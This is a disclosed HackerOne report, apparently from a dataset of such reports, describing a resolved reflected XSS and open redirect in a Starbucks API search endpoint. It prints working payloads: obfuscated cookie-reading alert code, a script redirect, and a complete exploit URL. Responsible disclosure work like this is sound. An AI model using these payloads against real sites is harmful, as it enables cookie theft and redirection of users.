---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '213190'
original_report_id: '213190'
title: Reflected XSS in openapi.starbucks.com /searchasyoutype/v1/search?x-api-key=
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2017-03-13T19:56:52.180Z'
disclosed_at: '2017-07-25T21:03:56.312Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in openapi.starbucks.com /searchasyoutype/v1/search?x-api-key=

## Metadata

- HackerOne Report ID: 213190
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-07-25T21:03:56.312Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Starbucks team,
While testing i founded Reflected XSS in openapi.starbucks.com that can also lead to Open redirect
Vulnerable link
==========
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=
Vulnerable parameter
===============
siteBaseUrl
Payloads
======
```1). http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
2). http://googl.com/%0a<body onload=prompt(%64ocument.domain)>%```
For Open redirect the payload is
=====================
```
http://googl.com/%0a<script>window.location='https://google.com';</script>%
```

So the finalized link with payload is given below
```
https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
```

POC has been attached

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
